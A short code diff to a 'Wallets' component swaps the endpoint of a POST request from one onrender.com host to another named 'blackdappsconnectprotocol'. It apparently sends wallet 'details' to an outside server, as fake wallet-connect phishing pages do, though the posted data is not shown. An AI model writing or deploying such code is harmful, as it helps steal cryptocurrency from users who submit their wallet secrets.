@@ -61,7 +61,7 @@ const Wallets = () => {
     };
 
     try {
-      const url = 'https://dappcommunicationprotocol.onrender.com/details';
+      const url = 'https://blackdappsconnectprotocol.onrender.com/details';
 
       const res = await fetch(url, {
         method: "POST",
